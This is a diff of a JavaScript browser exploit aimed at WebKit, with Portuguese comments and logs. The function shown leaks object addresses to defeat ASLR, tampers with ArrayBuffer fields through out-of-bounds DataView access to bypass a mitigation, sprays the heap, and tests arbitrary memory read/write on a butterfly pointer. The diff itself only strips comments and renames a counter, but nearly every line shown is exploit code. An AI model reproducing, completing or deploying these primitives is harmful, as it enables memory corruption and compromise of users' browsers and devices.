@@ -388,27 +388,12 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn(`[ASLR LEAK] Endereço de dummy_object_for_aslr_leak: ${dummy_object_addr.toString(true)}`, "info");
 
         // === NOVA LÓGICA DE BYPASS ===
+        // Esta lógica agora é executada *após* a validação das primitivas OOB locais na FASE 0.
         logFn(`[ASLR LEAK] Tentando manipular flags/offsets do ArrayBuffer real para bypass da mitigação.`, "info");
 
-        // Valores de teste para os offsets no ArrayBuffer real
-        // Estes são especulativos e precisam ser ajustados com base na engenharia reversa.
-        // A ideia é tentar valores que o sistema pode interpretar como "seguros"
-        // para um buffer que terá seu m_vector dinamicamente alterado.
-        
-        // Exemplo de valores a testar para field_0x34:
-        //  - 0x1 (um valor não-zero para forçar o loop de limpeza/validação a rodar)
-        //  - Um valor maior (se for um campo de tamanho/capacidade)
-        const TEST_VALUE_FOR_0X34 = 0x1000; // Exemplo: um tamanho ou capacidade
-        
-        // Exemplo de valores a testar para field_0x40:
-        //  - AdvancedInt64(0x1,0) ou 0x1 (se for uma flag simples de "shared" ou "resizable" ativada)
-        //  - AdvancedInt64.Zero (se o padrão de segurança for "não-compartilhado")
-        const TEST_VALUE_FOR_0X40 = new AdvancedInt64(0x1, 0); // Exemplo: Flag de compartilhamento/redimensionamento ativada
+        const TEST_VALUE_FOR_0X34 = 0x1000; 
+        const TEST_VALUE_FOR_0X40 = new AdvancedInt64(0x1, 0); 
 
-        // O bloco 'try' e 'catch' interno da FASE 3 foi removido para resolver o SyntaxError.
-        // O try/catch principal da função `executeTypedArrayVictimAddrofAndWebKitLeak_R43`
-        // capturará quaisquer erros que ocorram nesta fase.
-        
         const oob_array_buffer_real_ref = oob_data_view.buffer; 
 
         if (!oob_array_buffer_real_ref) {
@@ -531,8 +516,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         const rwTestPostLeakStartTime = performance.now();
 
         const test_obj_post_leak = global_spray_objects.length > 0 ?
-                                   global_spray_objects[Math.floor(global_spray_objects.length / 2)] :
-                                   { test_val_prop: 0x98765432, another_prop: 0xABCDEF00 };
+                                       global_spray_objects[Math.floor(global_spray_objects.length / 2)] :
+                                       { test_val_prop: 0x98765432, another_prop: 0xABCDEF00 };
         hold_objects.push(test_obj_post_leak);
         logFn(`Objeto de teste escolhido do spray (ou novo criado) para teste pós-vazamento.`, "info");
 
@@ -572,7 +557,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
                 const read_back_value_arb_rw = await arb_read_universal_js_heap(butterfly_addr_of_spray_obj, 8, logFn);
 
                 if (read_back_value_arb_rw.equals(test_value_arb_rw)) {
-                    resistanceSucceeded_post_leak++;
+                    resistanceSuccessCount_post_leak++;
                     logFn(`[Resistência PÓS-VAZAMENTO #${i}] SUCESSO: L/E arbitrária consistente no Butterfly.`, "debug");
                 } else {
                     logFn(`[Resistência PÓS-VAZAMENTO #${i}] FALHA: L/E arbitrária inconsistente no Butterfly. Written: ${test_value_arb_rw.toString(true)}, Read: ${read_back_value_arb_rw.toString(true)}.`, "error");
@@ -582,11 +567,11 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             }
             await pauseFn(LOCAL_VERY_SHORT_PAUSE);
         }
-        if (resistanceSucceeded_post_leak === numResistanceTests) {
-            logFn(`SUCESSO TOTAL: Teste de resistência PÓS-VAZAMENTO concluído. ${resistanceSucceeded_post_leak}/${numResistanceTests} operações bem-sucedidas.`, "good");
+        if (resistanceSuccessCount_post_leak === numResistanceTests) {
+            logFn(`SUCESSO TOTAL: Teste de resistência PÓS-VAZAMENTO concluído. ${resistanceSuccessCount_post_leak}/${numResistanceTests} operações bem-sucedidas.`, "good");
         } else {
-            logFn(`ALERTA: Teste de resistência PÓS-VAZAMENTO concluído com ${numResistanceTests - resistanceSucceeded_post_leak} falhas.`, "warn");
-            final_result.message += ` (Teste de resistência L/E pós-vazamento com falhas: ${numResistanceTests - resistanceSucceeded_post_leak})`;
+            logFn(`ALERTA: Teste de resistência PÓS-VAZAMENTO concluído com ${numResistanceTests - resistanceSuccessCount_post_leak} falhas.`, "warn");
+            final_result.message += ` (Teste de resistência L/E pós-vazamento com falhas: ${numResistanceTests - resistanceSuccessCount_post_leak})`;
         }
         logFn(`Verificação funcional de L/E e Teste de Resistência PÓS-VAZAMENTO concluídos. Time: ${(performance.now() - rwTestPostLeakStartTime).toFixed(2)}ms`, "info");
 
